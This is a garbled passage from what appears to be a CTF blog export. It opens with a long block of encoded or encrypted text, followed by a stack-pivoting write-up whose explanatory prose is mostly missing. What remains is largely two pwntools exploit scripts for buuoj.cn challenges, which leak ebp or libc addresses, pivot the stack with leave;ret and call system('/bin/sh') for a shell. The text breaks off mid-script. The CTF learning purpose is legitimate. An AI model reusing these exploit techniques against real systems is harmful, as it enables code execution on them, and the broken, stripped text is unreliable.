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 </div>","categories":[],"tags":["heap"]},{"title":"","url":"https://pz1o.top/2021/03/02//","content":"<h1 id=\"0x01-\"><a href=\"#0x01-\" class=\"headerlink\" title=\"0x01 \"></a>0x01 </h1><p>call</p>\n<blockquote>\n<p>push eip+4;</p>\n<p>push ebp;</p>\n<p>mov ebp,esp;</p>\n</blockquote>\n<p></p>\n<p><code>leave;ret;</code></p>\n<p>leave</p>\n<blockquote>\n<p>leave == mov esp,ebp; pop ebp;<br>ret == pop eip #eip</p>\n</blockquote>\n<p>reteip</p>\n<h1 id=\"0x02-\"><a href=\"#0x02-\" class=\"headerlink\" title=\"0x02 \"></a>0x02 </h1><p>read</p>\n<p>ebp</p>\n<h1 id=\"0x03-\"><a href=\"#0x03-\" class=\"headerlink\" title=\"0x03 \"></a>0x03 </h1><p>eipeipret</p>\n<p>eipret</p>\n<p>ebpespeip</p>\n<ol>\n<li>ebp</li>\n<li>espeip</li>\n</ol>\n<h1 id=\"0x04-\"><a href=\"#0x04-\" class=\"headerlink\" title=\"0x04 \"></a>0x04 </h1><h2 id=\"printf\"><a href=\"#printf\" class=\"headerlink\" title=\"printf\"></a>printf</h2><h3 id=\"ciscn-2019-es-2\"><a href=\"#ciscn-2019-es-2\" class=\"headerlink\" title=\"ciscn_2019_es_2\"></a>ciscn_2019_es_2</h3><blockquote>\n<p>ebp</p>\n</blockquote>\n<p></p>\n<p>ebp</p>\n<p></p>\n<p><img src=\"/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302164451946.png\" alt=\"image-20210302164451946\"></p>\n<p>  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28770</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.1\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.1\"</span>)</span><br><span class=\"line\">sys = elf.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">main = elf.sym[<span class=\"string\">\"main\"</span>]</span><br><span class=\"line\">leave_ret = <span class=\"number\">0x080484b8</span></span><br><span class=\"line\">pld = <span class=\"string\">\"A\"</span>*<span class=\"number\">0x27</span></span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">ebp = uu32(ru(<span class=\"string\">\"\\xff\"</span>,drop=<span class=\"literal\">False</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">leak(<span class=\"string\">\"ebp\"</span>,ebp)</span><br><span class=\"line\">esp = ebp - <span class=\"number\">0x48</span></span><br><span class=\"line\">pld = (<span class=\"string\">b\"A\"</span>*<span class=\"number\">0x4</span> + p32(sys) + p32(main) + p32(esp+<span class=\"number\">0x20</span>) + <span class=\"string\">\"/bin/sh\\x00\"</span> ).ljust(<span class=\"number\">0x28</span>,<span class=\"string\">'A'</span>) + p32(esp+<span class=\"number\">0x10</span>) + p32(leave_ret)</span><br><span class=\"line\">s(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bss\"><a href=\"#bss\" class=\"headerlink\" title=\"bss\"></a>bss</h2><h3 id=\"Black-Watch--PWN\"><a href=\"#Black-Watch--PWN\" class=\"headerlink\" title=\"[Black Watch ]PWN\"></a>[Black Watch ]PWN</h3><p><img src=\"/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302221412110.png\" alt=\"image-20210302221412110\"></p>\n<blockquote>\n<p>bssbsswritegetshell</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29456</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.2\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.2\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.231.so\"</span>)</span><br><span class=\"line\">bss = <span class=\"number\">0x0804A300</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x08048408</span></span><br><span class=\"line\">main = elf.sym[<span class=\"string\">\"main\"</span>]</span><br><span class=\"line\">puts = elf.sym[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">write_plt = elf.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">pld = p32(<span class=\"number\">0</span>) + p32(write_plt) + p32(main) + p32(<span class=\"number\">1</span>) + p32(write_got) + p32(<span class=\"number\">0x4</span>)</span><br><span class=\"line\">sa(<span class=\"string\">\"What is your name?\"</span>,pld)</span><br><span class=\"line\">pld = <span class=\"string\">b\"A\"</span>*<span class=\"number\">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class=\"line\">sa(<span class=\"string\">\"What do you want to say?\"</span>,pld)</span><br><span class=\"line\">write = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc_base = write - libc.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">sh = libc_base + next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">pld = p32(<span class=\"number\">0</span>) + p32(sys) + p32(<span class=\"number\">0</span>) + p32(sh)</span><br><span class=\"line\">sa(<span class=\"string\">\"What is your name?\"</span>,pld)</span><br><span class=\"line\">pld = <span class=\"string\">b\"A\"</span>*<span class=\"number\">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class=\"line\">sa(<span class=\"string\">\"What do you 